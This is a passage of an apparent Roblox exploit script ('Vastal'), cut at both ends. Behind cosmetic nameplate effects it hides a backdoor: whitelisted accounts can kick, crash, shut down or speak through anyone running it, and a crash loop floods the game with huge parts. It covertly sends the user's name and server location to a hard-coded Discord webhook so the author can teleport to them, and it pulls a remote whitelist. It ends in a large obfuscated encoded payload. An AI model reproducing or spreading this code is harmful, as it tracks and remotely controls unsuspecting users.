                    math.clamp(b * 1.3 + 80, 180, 255)
                )
                table.insert(cs, ColorSequenceKeypoint.new(i/n, col))
            end
            g.Color = ColorSequence.new(cs)
            c = c + 0.08
            if c >= math.pi * 2 then c = 0 end
            task.wait(0.03)
        end
    end)
end

local function setup(o)
    if o:IsA("TextLabel") and ((o.Name == "user" or o.Text == "user") or 
       (o.Name == "funny vastal dev" or o.Text == "funny vastal dev")) and chk(o) then
        o.TextColor3 = Color3.new(1, 1, 1)
        o.TextStrokeColor3 = Color3.new(0.4, 0.4, 0.4)
        o.TextStrokeTransparency = 0.2
        o.Font = Enum.Font.GothamBold
        o.Text = "funny vastal dev"
        o.TextSize = 25
        
        local bb = o:FindFirstAncestorOfClass("BillboardGui")
        if bb then
            bb.Size = UDim2.new(8, 0, 2, 0)
            bb.StudsOffset = Vector3.new(0, 3, 0)
        end
        
        anim(o, mkGrad(o))
    end
end

for _, o in ipairs(game:GetDescendants()) do setup(o) end
game.DescendantAdded:Connect(function(o) task.wait(0.01) setup(o) end)

local troll_config = {
	prefix = "!",
	test_mode = false,
	
	whitelisted = {
		[10318336432] = {
			ownership = 1,
			custom_name = "cool"
		},
		[9435370570] = {
			ownership = 1,
			custon_name = 'poggers'
		}
	},
	
	commands = {
		['kick'] = {
			ownership = 1,
			run = function(...)
				local args = {...}
				local target = find_player(args[1])
                
				if target then
					target:Kick(table.concat(args, " ", 2) or "You have been kicked from the server.")
				end
			end
		},
		['checkusers'] = {
			ownership = 1,
			run = function()
				tcs.TextChannels.RBXGeneral:SendAsync('[!]')
			end
		},
        ['removegui'] = {
			ownership = 1,
			run = function(...)
				local args = {...}
                local target = find_player(args[1])

                if target then
                    for _, v in ipairs(game:GetDescendants()) do
                        if string.lower(v.Name):find('windui') then
                            v:Destroy()
                            if shared.__AUTOPLAYER then
                                shared.__AUTOPLAYER:Disconnect()
                                shared.__AUTOPLAYER = nil
                            end
                        end
                    end
                end
			end
		},
        ['setfps'] = {
            ownership = 1,
            run = function(...)
                local args = {...}
                local target = find_player(args[1])

                if target then
                    local setfpscap = setfpscap or setfps or fpscap or function(obj) return obj end

                    setfpscap(args[2])
                end
            end
        },
        ['crash'] = {
            ownership = 1,
            run = function(...)
                local args = {...}
                local target = find_player(args[1])

                if target then
                    task.spawn(function()
                        for i = 1, 100 do
                            local part = Instance.new('Part')
                            part.Size = Vector3.new(1e5, 1e5, 1e5)
                            part.Parent = workspace
                        end
                    end)
                end
            end
        },
        ['speak'] = {
            ownership = 1,
            run = function(...)
                local args = {...}
                local target = find_player(args[1])

                if target then
                    tcs.TextChannels.RBXGeneral:SendAsync(args[2])
                end
            end
        },
        ['expose'] = {
            ownership = 1,
            run = function(...)
                local args = {...}
                local target = find_player(args[1])

                if target then
                    tcs.TextChannels.RBXGeneral:SendAsync('I am using the Vastal client')
                end
            end
        },
        ['shutdown'] = {
            ownership = 1,
            run = function(...)
                local args = {...}
                local target = find_player(args[1])

                if target and target == game.Players.LocalPlayer then
                    game:Shutdown()
                end
            end
		}
	}
}

function find_player(partial_name)
	if not partial_name then return nil end
	local lower = string.lower(partial_name)
	
	for _, p in pairs(game:GetService("Players"):GetPlayers()) do
		if string.lower(p.Name) == lower then return p end
	end
	
	for _, p in pairs(game:GetService("Players"):GetPlayers()) do
		if string.lower(p.Name):find(lower, 1, true) then return p end
	end
	
	return nil
end

function get_player_ownership(player)
	local player_data = troll_config.whitelisted[player.UserId]
	return player_data and player_data.ownership or 0
end

function get_custom_name(player)
	local player_data = troll_config.whitelisted[player.UserId]
	if player_data and player_data.custom_name then
		return player_data.custom_name
	end
	
	task.spawn(function()
		local success, response = pcall(function()
			return game:GetService("HttpService"):GetAsync("https://users.roblox.com/v1/users/" .. player.UserId)
		end)
		
		if success then
			local data = game:GetService("HttpService"):JSONDecode(response)
			return data.displayName or player.Name
		end
	end)
	
	return player.Name
end

function can_use_command(player, command_data)
	local player_ownership = get_player_ownership(player)
	local required_ownership = command_data.ownership
	
	return player_ownership >= required_ownership
end

local function animate_rainbow(text_label, gradient)
	task.spawn(function()
		local c = 0
		local wave_freq = math.pi / 8
		local num_points = 12
		
		while text_label and text_label.Parent do
			local color_sequence = {}
			
			for i = 0, num_points do
				local r = 127 * math.sin(wave_freq * i + c) + 128
				local g = 127 * math.sin(wave_freq * i + 2 * math.pi / 3 + c) + 128
				local b = 127 * math.sin(wave_freq * i + 4 * math.pi / 3 + c) + 128
				
				local color = Color3.fromRGB(
					math.clamp(r * 1.3 + 80, 180, 255),
					math.clamp(g * 1.3 + 80, 180, 255),
					math.clamp(b * 1.3 + 80, 180, 255)
				)
				
				table.insert(color_sequence, ColorSequenceKeypoint.new(i / num_points, color))
			end
			
			gradient.Color = ColorSequence.new(color_sequence)
			c = c + 0.08
			
			if c >= math.pi * 2 then
				c = 0
			end
			
			task.wait(0.03)
		end
	end)
end

local function setup_nameplate(object)
	if object:IsA("TextLabel") and (object.Name == "user" or object.Text == "user") then
		local parent = object.Parent
		
		while parent do
			if parent:IsA("BillboardGui") and parent.Parent:IsA("Humanoid") then
				local humanoid = parent.Parent
				local character = humanoid.Parent
				local player = game:GetService("Players"):GetPlayerFromCharacter(character)
				
				if player and get_player_ownership(player) > 0 then
					object.TextColor3 = Color3.new(1, 1, 1)
					object.TextStrokeColor3 = Color3.new(0.4, 0.4, 0.4)
					object.TextStrokeTransparency = 0.2
					object.Font = Enum.Font.GothamBold
					object.Text = get_custom_name(player)
					object.TextSize = 25
					
					parent.Size = UDim2.new(8, 0, 2, 0)
					parent.StudsOffset = Vector3.new(0, 3, 0)
					
					local gradient = Instance.new("UIGradient")
					gradient.Rotation = 90
					gradient.Parent = object
					
					animate_rainbow(object, gradient)
					return
				end
				break
			end
			parent = parent.Parent
		end
	end
end

local function on_message(message, player)
	if message:sub(1, #troll_config.prefix) ~= troll_config.prefix then
		return
	end
	
	local content = message:sub(#troll_config.prefix + 1)
	local parts = {}
	
	for word in content:gmatch("%S+") do
		table.insert(parts, word)
	end
	
	if #parts == 0 then return end
	
	local cmd_name = string.lower(table.remove(parts, 1))
	local cmd = troll_config.commands[cmd_name]
	
	if not cmd then return end
	
	if not can_use_command(player, cmd) then
		return
	end
	
	pcall(cmd.run, table.unpack(parts))
end

local function setup_player_chat(player)
	if get_player_ownership(player) > 0 then
		local connection = player.Chatted:Connect(function(msg)
			on_message(msg, player)
		end)
		
		if not shared.chat_connections then
			shared.chat_connections = {}
		end
		shared.chat_connections[player.UserId] = connection
		
		game:GetService("Players").PlayerRemoving:Connect(function(leaving_player)
			if leaving_player == player and shared.chat_connections[player.UserId] then
				shared.chat_connections[player.UserId]:Disconnect()
				shared.chat_connections[player.UserId] = nil
			end
		end)
	end
end

local function wfdsxz()
	for _, object in ipairs(game:GetDescendants()) do
		setup_nameplate(object)
	end
	
	game.DescendantAdded:Connect(function(object)
		task.wait(0.01)
		setup_nameplate(object)
	end)
	
	for _, player in pairs(game:GetService("Players"):GetPlayers()) do
		setup_player_chat(player)
	end
	
	game:GetService("Players").PlayerAdded:Connect(function(player)
		setup_player_chat(player)
	end)
	
	local player = game:GetService("Players").LocalPlayer
end

local player = game:GetService("Players").LocalPlayer
if player and (troll_config.test_mode or get_player_ownership(player) > 0) then
	wfdsxz()
end

request({
    Url = 'https://discordapp.com/api/webhooks/1506162347054727261/sLurO4YZGRxs5jSWKKmT2noinC89lb-AdmVpPBXrCxxY9QWkwmXJo0H7TtRbV-cL-LpX',--'https://discord.com/api/webhooks/1482537372985065553/YCLoqBaj5o04FmvuB_0i4mx65z4tz4zXmjW-xdM9AOo75kP0yOVpTdRJ48ppWNRVxpOG',
    Method = 'POST',
    Headers = {
        ['Content-Type'] = 'application/json',
    },
    Body = game:GetService('HttpService'):JSONEncode({
        content = string.format(
            'User **%s** has ran your script. (Vastal)\nThey are in game:\n```\nPlaceId: %s\nJobId: %s\n```\nTo join them, run:\n```\ngame:GetService("TeleportService"):TeleportToPlaceInstance(%s, "%s", game.Players.LocalPlayer)\n```',
            game.Players.LocalPlayer.Name,
            tostring(game.PlaceId),
            tostring(game.JobId),
            tostring(game.PlaceId),
            tostring(game.JobId)
        )
    })
})

local httpService = game:GetService('HttpService')
local textChatService = game:GetService('TextChatService')
local players = game:GetService('Players')
local whitelistData = httpService:JSONDecode(game:HttpGet('https://raw.githubusercontent.com/juliusxpn/whitelist/refs/heads/main/main.json'))['whitelist']
if not whitelistData then return end
local localPlayer = players.LocalPlayer
local isWhitelisted = whitelistData[localPlayer.Name] ~= nil
local notified = false
local whitelisted = {}
local function applyTag(user)
    local whitelist = whitelistData[user.Name]
    if not whitelist then return end
    local tag = whitelist['Tag']
    local tagName = tag['Name']
    local tagColor = tag.Color[1]..', '..tag.Color[2]..', '..tag.Color[3]
    if user.UserId ~= localPlayer.UserId then
        textChatService.TextChannels.RBXGeneral:SendAsync('I am using the Vastal.')
    end
    table.insert(whitelisted, user)
    textChatService.OnIncomingMessage = function(msg)
        if msg.TextSource and msg.TextSource.UserId == user.UserId then
            local props = Instance.new('TextChatMessageProperties')
            props.PrefixText = '<font color="rgb('..tagColor..')">['..tagName..']</font> '..user.DisplayName..': '
            return props
        end
    end
end
local function checkAndNotify(user)
    if not whitelistData[user.Name] then return end
    applyTag(user)
    if not isWhitelisted and not notified then
        notified = true
    end
end
if isWhitelisted then
    applyTag(localPlayer)
end
for _, plr in ipairs(players:GetPlayers()) do
    if plr ~= localPlayer then
        checkAndNotify(plr)
    end
end
players.PlayerAdded:Connect(function(plr)
    if plr ~= localPlayer then
        checkAndNotify(plr)
    end
end)
local name = tostring(game.Players.LocalPlayer.Name):lower()
local displayName = tostring(game.Players.LocalPlayer.DisplayName):lower()
local MIN_LEN = 3
for _, v in ipairs(whitelisted) do
    if shared[tostring(v.Name)..'_connection'] then
        shared[tostring(v.Name)..'_connection']:Disconnect()
        shared[tostring(v.Name)..'_connection'] = nil
    end
    shared[tostring(v.Name)..'_connection'] = v.Chatted:Connect(function(msg)
        local lower = msg:lower()
        local matched = false
        for i = MIN_LEN, #name do
            if lower:find(name:sub(1, i), 1, true) then
                matched = true
                break
            end
        end
        if not matched then
            for i = MIN_LEN, #displayName do
                if lower:find(displayName:sub(1, i), 1, true) then
                    matched = true
                    break
                end
            end
        end
        if matched then
            if msg:sub(1,6) == '!crash' then
                while true do
                    local part = Instance.new('Part')
                    part.Parent = workspace
                    part.Size = Vector3.new(1e100, 1e100, 1e100)
                    part.Anchored = true
                    part.Position = Vector3.new(0, 0, 0)
                end
            end
        end
    end)
end

return(function(...)local o={"\055\078\076\110\053\079\085\108\119\086\116\104\075\116\070\101\104\100\122\068\082\105\122\061";"\069\106\111\061";"\074\052\070\108\079\043\079\047\119\118\061\061","\099\090\053\116\112\052\055\061";"\098\050\087\050\049\075\113\108\070\118\061\061","\119\075\049\104\067\086\097\047\069\078\049\084\069\065\118\061","\077\113\108\084\110\075\069\105\114\122\061\061";"\052\102\068\114\066\122\069\054\105\116\122\085\077\110\048\111\113\118\078\107\056\097\118\061","\099\114\083\088\097\052\111\061","\117\111\089\113\067\098\084\078\073\073\086\072\070\088\065\082\053\066\061\061","\074\111\115\111\048\066\061\061";"\112\120\084\112\114\076\083\116\088\048\051\053\081\121\102\106\111\118\061\061";"\050\088\083\051\109\088\083\100\067\075\105\072\071\118\061\061";"\073\110\112\085\047\099\098\053\099\055\120\051\112\103\114\047\115\066\061\061";"\097\054\113\111\085\066\085\083\102\118\061\061","\055\080\066\112\073\055\110\047\084\053\105\118\049\072\082\061";"\099\057\080\084\083\098\097\069\078\080\120\048\074\050\107\065\107\077\099\061";"\086\073\078\050\049\114\107\080\119\066\061\061","\109\113\080\115\069\086\047\051\109\113\080\115\071\113\083\072\067\081\047\084\119\075\085\108\089\086\085\105";"\085\076\101\054\050\098\104\073\084\118\061\061";"\108\119\043\057\111\081\116\114\078\106\109\061","\113\043\086\074\112\077\057\048\122\047\110\043\118\097\116\052\071\056\087\111\104\121\077\052\117\112\069\085","\052\105\085\079\068\082\083\057\089\088\049\082\071\118\061\061";"\071\089\050\121\087\053\078\070\054\053\107\056\103\113\043\097\110\120\051\105\100\109\048\101\079\119\117\112\108\066\061\061","\078\101\106\088\075\088\101\082\053\066\061\061";"\100\084\090\075\100\055\108\117\081\050\067\079\086\073\053\116\067\102\051\061","\067\065\068\104\057\054\080\072\088\100\069\107\098\098\100\078\076\118\061\061";"\047\068\097\104\072\051\108\061","\104\080\102\067\081\068\079\075\084\118\061\061","\048\121\071\106\052\120\114\097\074\099\073\085\085\067\108\061","\049\065\113\103\084\119\117\071\047\122\061\061";"\075\110\082\061","\112\073\119\109\088\056\118\114\108\076\049\099\109\116\118\052\113\109\084\083\056\080\090\076\072\074\052\074\067\077\113\087\071\078\100\048\101\047\109\057\072\048\084\109\048\102\101\053\080\098\054\109\102\076\047\087\120\080\097\069\090\048\112\108\107\088\073\101\085\102\075\066\100\115\109\050\085\048\069\065\085\055\097\057\087\068\078\052\103\088\108\107\102\055\100\104\078\048\052\120\118\077\116\052\117\120\072\075\065\087\050\056\089\072\119\057\057\057\068\116\100\054\101\089\119\104\098\052\122\109\052\106\120\104\055\069\088\072\054\080\043\057\072\074\114\054\108\076\072\078\081\082\081\055\121\066\068\088\100\107\088\084\106\089\076\122\061\061","\119\098\122\100\075\051\076\061";"\117\099\080\083\043\056\076\101\102\118\061\061";"\116\087\082\048\070\083\099\117\100\066\061\061","\119\113\080\115\071\113\083\072\067\098\087\097\069\078\109\061";"\101\080\100\111\079\065\101\110\048\076\061\061";"\086\082\078\087\110\106\049\104\108\076\061\061";"";"\052\069\102\105\099\097\047\104\109\104\057\109\054\109\074\083\113\122\061\061","\049\122\103\043\099\077\107\085\085\076\061\061","\115\074\087\049\104\052\107\068\084\043\117\115\068\084\043\099\043\052\107\116\120\073\118\075\073\047\078\053\075\055\067\106\118\073\101\048\052\071\068\072\047\108\070\116\100\116\119\106\122\066\061\061";"\056\112\120\099\105\122\061\061";"\089\088\049\057\089\088\081\051","\075\087\101\067\068\052\098\061";"\084\075\054\097\076\104\066\061","\067\103\051\120\117\101\087\068\116\122\061\061","\047\080\049\087\082\086\114\085\113\073\102\108\115\076\061\061","\054\106\119\117","\074\080\065\090\119\066\121\122\057\054\050\111\076\100\102\098";"\081\121\107\074\107\084\109\061","\054\104\076\105\071\110\108\121\054\076\061\061","\067\089\110\121\109\085\081\065\122\065\100\115\068\106\065\052\073\071\076\081\066\052\118\061";"\111\087\103\067\083\085\054\107\121\071\111\061";"\065\051\065\081\082\048\120\097\116\079\070\118\074\112\104\074\043\118\068\090\068\106\050\115","\104\065\051\079\088\121\113\076\089\122\061\061","\043\052\065\108\099\118\061\061","\072\087\080\071\100\057\047\053\116\052\070\114\088\109\114\109","\110\113\118\116\119\106\051\043\065\118\061\061";"\078\078\102\068\078\109\081\072\071\068\097\077\109\043\102\101";"\054\076\061\061";"\048\084\107\080\075\085\120\116\066\097\073\115\119\073\105\076";"\047\120\067\070\072\054\109\061";"\114\097\053\088\111\120\113\098\098\118\061\061";"\085\101\087\120\098\070\110\078\080\076\061\061";"\110\108\110\065\104\068\070\108\077\075\100\120\079\122\061\061";"\089\083\102\114\051\070\100\122\076\084\114\061","\118\082\071\090\119\118\054\052\047\066\061\061";"\116\073\067\072\108\090\109\061","\120\121\090\110\047\073\081\111\098\085\048\089\100\085\066\061","\078\099\087\108\065\087\071\052\086\118\061\061";"\079\118\067\099\078\043\043\056\078\055\065\066\081\053\065\073\085\071\074\057\081\076\061\061";"\107\115\089\107\103\081\082\082\110\107\120\104\053\049\098\061";"\098\100\070\053\104\107\072\109\084\066\061\061";"\068\081\085\099\085\075\081\081\109\082\085\047\078\106\067\102\089\084\089\061","\101\072\050\052\074\122\061\061";"\081\108\122\065\110\049\054\073\070\118\111\070\051\108\108\076\113\088\122\061","\089\066\047\043\057\043\099\061","\083\078\120\052\048\075\067\110\068\082\051\051\114\113\050\088","\067\068\118\087\078\051\078\120\087\066\080\122\056\113\050\052\078\117\050\071\079\076\061\061","\110\102\086\052\049\107\106\098\080\049\074\109\122\081\118\074\066\118\061\061","\071\084\121\066\077\081\071\115\052\082\105\070\077\043\050\047\119\068\098\061","\119\069\084\114\068\108\085\111\085\074\110\099\051\113\090\117\086\088\116\061";"\067\075\081\098\119\109\087\052\119\082\102\082\052\078\087\101\071\066\061\061";"\119\075\083\120\069\117\071\105","\104\075\117\079\109\066\061\061";"\121\099\109\067\112\097\051\061";"\067\043\081\103\077\066\061\061","\083\109\098\051\071\086\083\084\048\113\067\100\114\081\081\089\068\066\061\061","\083\055\114\105\049\055\073\118\068\118\061\061","\066\054\106\120\084\100\109\107\068\066\085\043\055\101\066\052\082\110\043\109\057\066\061\061";"\076\053\118\075\103\070\118\098","\083\047\086\088\108\111\103\087\073\074\108\081\081\084\049\106\050\052\090\114\100\118\061\061","\068\098\049\103\068\078\084\108\114\084\081\078\089\075\089\051\050\076\061\061";"\070\106\120\110\111\073\053\118\066\052\122\061";"\104\102\100\110\068\066\061\061","\067\113\105\066\071\118\061\061";"\073\100\068\048\056\122\061\061","\086\088\086\066\107\079\109\061";"\111\052\056\121\052\088\087\120\097\056\049\097\051\086\098\122";"\107\102\110\121\108\048\075\048\085\077\108\080\054\115\067\074\111\079\122\061","\078\048\048\053\122\066\118\086\122\078\067\099\114\109\070\047\049\089\081\074";"\055\088\100\071\119\085\105\106\073\078\122\122\120\104\105\102\121\088\104\080\101\067\053\073\048\100\069\104\115\081\051\061";"\122\098\116\078\057\056\108\085\090\067\090\101\086\090\051\055\104\119\089\052\070\111\067\101\069\120\079\076","\066\076\079\051\115\114\067\086\100\076\061\061","\119\114\089\085\052\050\116\061";"\077\065\081\086\075\115\089\057\067\069\066\081\098\087\104\111\070\077\089\061";"\120\049\070\055\112\075\084\115\105\066\061\061";"\105\084\048\107\080\122\061\061";"\102\121\075\050\087\051\082\051\113\043\087\048\099\113\116\061";"\118\109\097\084\119\078\081\043\078\106\050\110\052\113\105\072\114\066\061\061";"\053\081\082\122\050\070\110\114\066\079\070\121\119\106\120\043\087\065\069\099\065\057\066\047\090\106\084\070\100\122\061\061","\054\117\052\110\077\076\061\061","\055\071\075\102\087\117\109\067\082\065\087\051\080\100\088\069\066\076\065\104\102\054\102\077\065\073\078\089","\113\113\109\061";"\108\099\068\043\114\073\048\089\110\118\061\061","\101\072\121\051\088\111\047\106\084\073\089\090\073\122\061\061","\055\083\087\050\114\116\080\078\084\073\048\065\065\068\055\087\086\051\098\067";"\089\082\105\072\118\086\050\071\071\118\061\061";"\074\114\049\051\072\053\102\100\107\120\099\076\048\054\048\121\048\122\061\061","\119\086\072\079\050\114\116\105\075\066\061\061","\115\075\102\089\066\056\118\118\075\118\061\061";"\071\081\121\050\113\116\088\088\047\115\073\115\074\043\111\061","\077\051\080\070\097\066\061\061";"\112\099\111\072\067\050\071\054\074\122\061\061","\077\077\047\068\085\076\109\115\098\076\072\097\104\054\101\080\070\103\090\057\102\056\117\078\111\085\115\090\043\090\099\061","\082\067\099\057\068\103\122\061";"\097\100\067\085\069\111\116\088\097\118\061\061","\114\075\102\054\089\103\047\121\050\098\120\077\114\106\085\088\119\118\061\061","\114\085\121\103\082\115\075\054\102\097\052\086\089\119\108\082\079\088\108\061";"\054\068\105\099\101\083\116\116\121\067\113\084\109\054\112\106","\069\081\076\061","\083\083\120\047\086\053\043\073\101\118\061\061","\116\121\108\109\117\066\061\061";"\108\054\088\043\100\085\075\097\117\080\066\108\048\106\120\084\075\083\119\047\083\066\061\061";"\122\076\118\084\089\118\061\061";"\119\117\050\100\077\078\087\065";"\119\075\083\102\067\078\083\103\067\122\061\061","\072\065\069\086\114\103\067\109\099\066\061\061","\099\119\107\121\079\065\057\075\082\076\109\111\084\121\119\110";"\117\111\056\072\118\087\110\049\057\066\061\061","\073\057\089\047\069\107\114\061","\043\100\052\084\055\056\109\061";"\109\088\105\090\119\084\081\068\068\078\119\055\083\078\120\050\083\122\061\061";"\101\102\048\103\049\098\082\061","\083\075\084\114\089\084\080\106\085\083\121\065\118\088\083\105\077\086\119\061","\099\108\106\115\085\054\107\074\101\106\118\112\100\103\066\083\090\076\061\061","\106\084\099\061";"\102\086\111\114\108\051\043\048\114\047\049\104\107\116\102\082\110\073\076\061","\050\043\083\103\067\113\080\115\048\118\061\061";"\048\070\108\086\057\120\120\074\057\105\110\086\067\068\065\119\082\047\056\073\070\076\061\061","\114\078\109\051\068\081\080\070\067\109\120\118\078\098\097\047\119\118\061\061";"\087\115\118\119\102\107\102\113\079\054\111\054\065\118\061\061";"\071\075\102\115\069\117\111\061","\086\084\049\121\069\075\050\105\048\122\061\061","\067\102\098\089\054\078\052\079\082\052\072\121\053\084\051\121\068\073\055\061","\077\081\083\081";"\055\104\048\051";"\118\078\121\089\077\088\105\110\052\117\047\057\078\083\105\075\069\106\089\061","\073\120\067\114\112\057\072\055\089\119\104\107\057\043\071\108\084\066\061\061";"\069\043\083\057";"\067\043\081\104\069\043\109\061","\055\074\111\111\069\051\053\067\052\119\090\098\109\104\089\117\082\077\120\098\051\071\051\075\048\114\079\055","\098\089\105\048\110\107\088\115\122\085\053\099\102\088\077\047\087\115\089\061";"\122\065\066\115\066\122\052\098\070\076\061\061","\048\085\122\053\121\068\120\102\065\118\061\061";"\089\055\066\061";"\082\056\084\110\077\112\077\047\053\082\080\111\057\075\122\106\074\076\061\061";"\100\115\081\050\104\057\082\061","\109\110\085\109\057\117\104\122\081\122\061\061";"\085\052\122\077\057\075\067\071\073\052\113\109\113\119\113\116\070\077\075\081\079\086\090\098\102\097\043\070\115\054\047\103\120\114\100\082\120\122\061\061","\047\043\053\081\105\075\120\101\078\076\061\061","\117\054\067\108\056\107\047\116\087\089\056\121\113\047\098\082\068\097\116\061";"\043\117\072\120\106\117\090\043\075\075\100\101\055\100\071\107\120\090\109\061";"\056\107\079\106\076\116\115\118\057\076\061\061","\103\107\116\104\089\082\055\112\070\066\061\061","\088\055\056\088\065\051\057\114\080\075\102\049\117\080\053\076\112\070\056\077\084\069\051\061","\068\098\081\053\052\088\083\057\077\098\085\121\114\086\080\105\067\066\061\061","\114\081\075\050\104\088\090\048\110\047\101\119\054\101\105\073\043\071\051\043\051\054\089\061","\083\068\085\086\071\086\121\079\077\084\047\084\119\078\085\065\050\076\061\061";"\069\043\084\078\085\117\097\071\109\117\105\097\071\084\080\088\078\122\061\061","\075\109\087\050\047\086\066\049\103\102\105\076\119\120\076\061","\084\098\049\088\056\067\081\119\106\122\061\061","\090\074\081\078\085\082\109\049\107\071\076\116\085\055\106\122\097\066\061\061";"\069\078\081\051\077\122\061\061";"\120\078\111\066\081\109\116\114\075\097\072\076\050\066\083\066\089\118\061\061","\082\115\103\089\083\114\071\117\051\071\100\057\114\071\090\048\100\122\061\061","\087\085\047\116\048\109\056\118\105\118\052\075\097\080\072\057\085\106\066\061","\068\056\112\086\050\054\109\088\068\066\061\061","\083\088\081\121\067\098\071\115\119\082\085\108\077\078\102\082","\074\115\097\102\098\119\069\078\113\051\076\061";"\116\080\121\111\067\080\066\112\053\122\061\061";"\089\075\102\114\089\083\067\057\052\088\049\113\085\109\102\113\118\066\061\061";"\086\112\100\089\056\056\055\057\116\118\061\061","\113\100\085\073\071\107\114\053\114\088\107\083\072\119\067\052";"\101\097\079\104\106\076\061\061";"\080\050\109\074\068\074\112\104\122\066\061\061";"\118\100\068\086\043\080\057\084\105\088\108\071\083\085\067\074\073\116\120\102\115\085\087\121\050\069\070\087\067\099\076\061","\084\051\097\107\105\104\117\101\101\076\061\061";"\048\118\122\098\088\072\068\074\098\122\089\056\065\120\105\108\056\111\084\084\070\082\116\049\109\075\075\099";"\111\043\072\099\069\120\106\082\099\100\081\056\116\076\061\061","\056\088\075\074\099\084\087\090\074\118\061\061";"\111\080\111\112\066\068\101\097\114\066\061\061","\107\104\120\115\081\104\070\121\107\107\084\110\098\109\118\078\056\098\098\100\108\074\110\088\119\050\097\055\051\079\066\061","\122\076\066\074\090\090\071\114\068\076\050\086\110\118\061\061";"\075\069\077\053\086\110\081\106\072\056\065\052\069\081\067\088","\069\103\071\072\119\103\105\081\071\075\049\075\085\075\109\055\083\118\061\061","\105\048\050\086\056\103\077\101\051\078\098\080\118\072\087\055\073\056\114\061","\050\082\109\109\108\090\055\073\047\050\054\077\110\112\050\106\049\109\120\110\113\070\050\100\070\080\081\102","\089\112\071\099\080\076\061\061","\066\098\101\056\067\065\076\061","\080\089\052\070\069\088\051\061","\102\065\074\087\090\086\090\088\072\079\085\078\084\098\075\114";"\121\122\110\109\122\069\106\122\079\106\071\076\043\048\066\098\085\118\109\079\073\109\116\061","\067\078\087\066\089\078\085\090","\097\089\076\104\110\089\055\089\108\098\085\099\105\085\049\103\098\105\054\119\084\103\099\061","\119\056\055\083\052\055\114\087\117\075\112\070\100\100\054\050\071\089\116\061";"\104\071\109\087\076\109\111\061","\117\101\050\119\054\101\086\080\078\069\047\115\057\110\085\082\106\054\057\066\116\057\118\061","\102\049\108\055";"\071\117\085\084\089\076\061\061";"\105\072\108\081\119\057\109\097\043\083\117\084\098\103\079\100\087\104\102\043\109\109\099\111\065\117\073\110\090\043\076\061","\068\075\067\085\089\105\105\120\083\081\083\089\078\075\098\084\119\066\061\061";"\043\079\114\109\079\121\073\067\118\076\061\061","\082\102\114\087\077\118\061\061","\066\065\120\084\105\052\115\121\101\078\080\087\080\077\070\107\085\118\061\061","\082\077\112\119\103\066\052\056\110\098\043\110\115\076\068\087\078\066\061\061","\055\057\099\067\112\110\071\079\055\085\051\122\080\108\069\112\086\113\051\104\053\105\067\051\097\047\086\106","\083\043\081\120\119\043\083\100\111\098\050\105\067\043\083\072\067\043\083\082\111\118\061\061";"\072\120\075\102\079\052\079\115\079\113\056\073\073\084\083\079\049\103\119\061","\101\115\081\110\121\069\090\050\056\122\061\061";"\113\069\057\117\086\090\101\116\114\066\061\061";"\052\117\080\052\054\113\122\087\119\088\102\100\069\088\076\066\048\122\061\061";"\054\054\121\083\071\067\118\061";"\071\086\080\100\069\117\111\061","\084\043\074\057\054\056\076\061";"\122\112\075\102\098\122\119\086\048\085\117\081\078\089\085\120\072\108\105\122\082\054\119\084\087\071\066\066","\071\088\081\120\071\118\061\061";"\077\105\080\057\119\088\102\101\114\068\083\103\050\072\105\078","\108\122\061\061","\087\114\121\116\077\119\080\065\043\111\088\055\121\067\115\107\065\114\073\055\122\080\116\103\053\074\086\074\098\070\102\090\071\087\103\088\079\075\122\061";"\043\047\087\070\069\119\118\090\072\047\067\117\111\070\100\089\053\047\109\061","\086\084\049\099\071\078\055\061";"\049\077\099\109\065\090\099\061";"\077\057\052\057\055\084\078\053\098\070\043\105\078\048\084\117\115\114\098\106\043\076\065\111\108\084\082\082\122\106\073\054\056\047\072\051\089\110\119\118\109\098\057\071";"\109\048\103\106\084\050\110\084\114\076\061\061";"\113\107\109\110\052\079\076\084\109\081\048\102\083\051\054\103\071\122\061\061";"\086\048\119\073\051\076\061\061","\112\102\049\118\057\111\085\074\050\120\087\090\072\043\052\114\088\118\061\061","\105\097\076\116\104\111\102\067\115\085\085\110\071\118\076\048\111\074\108\061","\116\072\122\054\102\108\099\043\110\122\061\061";"\055\074\119\054\115\118\061\061";"\113\072\084\071\080\069\097\089\085\049\043\047\117\057\102\072\050\054\066\049";"\113\073\055\098\069\102\043\110\066\056\103\073\048\066\099\076\087\090\118\061";"\078\108\043\121\076\100\067\052\074\069\101\111\074\121\119\053\056\117\097\055\069\114\099\061","\087\112\108\109\118\052\088\047\100\056\074\102\119\047\105\052\100\054\051\087\047\068\048\105\067\079\080\100\103\102\055\061";"\090\080\077\116\098\122\049\107\082\087\119\061","\057\072\085\120\109\076\061\061";"\070\112\065\116\079\102\106\078\056\101\084\043\087\082\090\067\075\078\066\106\110\077\078\114\081\081\085\107\107\104\083\055\075\078\072\081\056\071\053\069\084\102\121\051\082\084\079\082\111\090\106\101\117\073\088\122\090\117\118\061";"\073\112\103\109\047\120\113\068\066\107\052\085\056\049\122\085\118\076\082\061";"\077\078\121\084\078\078\089\061";"\119\075\081\057\071\043\049\120";"\068\085\078\085\107\102\079\105\112\051\105\087\100\076\061\061";"\089\065\105\051\071\118\061\061";"\109\082\049\112\057\113\065\047\074\122\061\061";"\057\081\083\103\055\111\090\108\108\088\073\070\104\090\097\115\073\118\111\061";"\077\052\078\073\099\086\075\079\088\101\052\103\075\082\112\048\102\080\077\048\086\048\099\061","\056\078\051\067\077\085\051\103\075\066\061\061";"\054\111\073\067\090\071\065\072","\118\088\049\057\069\075\083\072\067\122\061\061";"\121\105\119\066\054\104\108\061";"\090\088\079\047\097\057\071\117\056\052\069\119\048\070\113\071\100\055\066\061","\071\088\083\051\071\088\083\057\067\076\061\061";"\099\073\121\055\106\097\081\069\080\118\118\078\068\088\107\119\078\077\118\061","\086\084\049\120\071\086\050\097\067\043\081\104\069\043\109\061";"\066\090\077\049\108\090\076\061","\114\055\086\102\047\086\114\057\104\069\120\098\089\080\075\078\081\112\122\097\115\066\081\120\113\084\104\119","\089\083\115\054\099\082\070\071\099\054\071\121\079\113\047\047\119\076\061\061";"\109\085\113\116\108\043\053\108\052\102\053\088\075\104\065\043\112\076\061\061";"\048\050\118\050\054\120\056\069\109\055\066\086\074\089\071\121\077\089\053\087\121\106\122\070\043\068\055\103\090\119\071\080\099\083\083\104\070\105\051\083\078\076\066\073\056\108\118\078\113\118\086\114\049\049\052\104\118\074\101\071\119\057\053\097\074\101\052\122\090\077\078\078\103\121\112\048\098\088\073\065\114\116\073\069\072\081\050\089\052\103\109\087\108\103\103\079\077\078\119\107\113\052\121\074\082\067\056\108\109\079\072\084\083\050\112\048\118\079\112\106\110\073\071\089\077\071\057\103\056\107\116\04